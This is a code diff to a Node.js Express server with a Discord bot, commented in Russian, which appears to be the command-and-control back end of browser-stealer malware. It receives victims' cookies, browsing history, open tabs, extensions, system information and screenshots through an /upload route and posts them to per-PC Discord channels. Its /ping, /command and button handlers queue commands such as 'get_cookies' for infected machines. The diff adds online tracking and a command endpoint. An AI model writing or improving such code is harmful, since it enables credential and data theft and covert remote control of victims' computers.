@@ -4,16 +4,23 @@ import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle
 const app = express();
 app.use(express.json({ limit: "50mb" }));
 
+// Переменные окружения
 const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
 const GUILD_ID = process.env.GUILD_ID;
 const CATEGORY_NAME = "Все ПК";
 
-const onlinePCs = {};
-const pendingCommands = {};
+// Онлайн ПК и команды
+const onlinePCs = {};          // { pcId: lastPingTimestamp }
+const pendingCommands = {};    // { pcId: [ 'get_cookies', ... ] }
+const messagesWithButtons = {}; // { pcId: messageId }
 
+// Таймаут для онлайн (миллисекунды)
+const ONLINE_TIMEOUT = 60000;
+
+// ------------------ Discord Bot ------------------
 const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
 
-bot.once("clientReady", () => {
+bot.once("ready", () => {
   console.log(`✅ Бот вошёл как ${bot.user.tag}`);
 });
 
@@ -49,7 +56,9 @@ bot.on("interactionCreate", async interaction => {
   if (!interaction.isButton()) return;
 
   const [command, pcId] = interaction.customId.split("-");
-  if (!onlinePCs[pcId]) {
+  const lastPing = onlinePCs[pcId];
+
+  if (!lastPing || (Date.now() - lastPing > ONLINE_TIMEOUT)) {
     await interaction.reply({ content: `❌ ПК ${pcId} оффлайн`, ephemeral: true });
     return;
   }
@@ -60,7 +69,7 @@ bot.on("interactionCreate", async interaction => {
   await interaction.reply({ content: `✅ Команда "${command}" отправлена ПК ${pcId}`, ephemeral: true });
 });
 
-// ------------------ Создание канала для ПК ------------------
+// ------------------ Создание каналов ------------------
 async function getOrCreateCategory(guild, name) {
   let category = guild.channels.cache.find(c => c.type === 4 && c.name === name);
   if (!category) {
@@ -78,9 +87,12 @@ async function getOrCreateTextChannel(guild, name, parentId) {
 }
 
 // ------------------ Маршруты сервера ------------------
+
+// Приём данных от ПК
 app.post("/upload", async (req, res) => {
   try {
     const { pcId, cookies, history, systemInfo, tabs, extensions, screenshot } = req.body;
+    if (!pcId) return res.status(400).json({ error: "pcId required" });
 
     onlinePCs[pcId] = Date.now();
 
@@ -99,8 +111,11 @@ app.post("/upload", async (req, res) => {
 
     if (files.length) await channel.send({ files });
 
-    // Добавляем интерактивное сообщение с кнопками
-    await channel.send({ content: `Управление ПК ${pcId}`, components: createControlButtons(pcId) });
+    // Отправляем кнопки только один раз
+    if (!messagesWithButtons[pcId]) {
+      const message = await channel.send({ content: `Управление ПК ${pcId}`, components: createControlButtons(pcId) });
+      messagesWithButtons[pcId] = message.id;
+    }
 
     res.json({ success: true });
   } catch (err) {
@@ -109,10 +124,11 @@ app.post("/upload", async (req, res) => {
   }
 });
 
-// Ping ПК
+// Ping ПК → отдаём команды
 app.post("/ping", (req, res) => {
   const { pcId } = req.body;
   if (!pcId) return res.status(400).json({ error: "pcId required" });
+
   onlinePCs[pcId] = Date.now();
 
   const commands = pendingCommands[pcId] || [];
@@ -120,6 +136,27 @@ app.post("/ping", (req, res) => {
   res.json({ commands });
 });
 
+// Проверка онлайн ПК
+app.get("/online", (req, res) => {
+  const now = Date.now();
+  const online = Object.entries(onlinePCs)
+    .filter(([_, ts]) => now - ts < ONLINE_TIMEOUT)
+    .map(([id]) => id);
+  res.json({ online });
+});
+
+// Отправка команды конкретному ПК
+app.post("/command", (req, res) => {
+  const { pcId, command } = req.body;
+  if (!pcId || !command) return res.status(400).json({ error: "pcId and command required" });
+
+  if (!pendingCommands[pcId]) pendingCommands[pcId] = [];
+  pendingCommands[pcId].push(command);
+
+  res.json({ success: true });
+});
+
+// ------------------ Запуск сервера ------------------
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));
 
